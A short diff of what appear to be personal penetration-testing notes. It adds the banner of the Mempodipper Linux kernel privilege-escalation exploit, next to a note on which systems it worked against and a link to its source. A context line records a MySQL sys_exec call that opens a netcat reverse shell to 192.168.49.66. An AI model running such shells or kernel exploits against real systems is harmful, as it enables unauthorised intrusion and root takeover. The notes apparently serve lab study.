@@ -673,6 +673,11 @@ select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
 # LINUX KERNEL EXPLOITS
 ```bash
 Success:
+===============================
+=          Mempodipper        =
+=           by zx2c4          =
+=         Jan 21, 2012        =
+===============================
 OS: Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
 Memodripper https://www.kernel-exploits.com/media/memodipper.c
 x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.
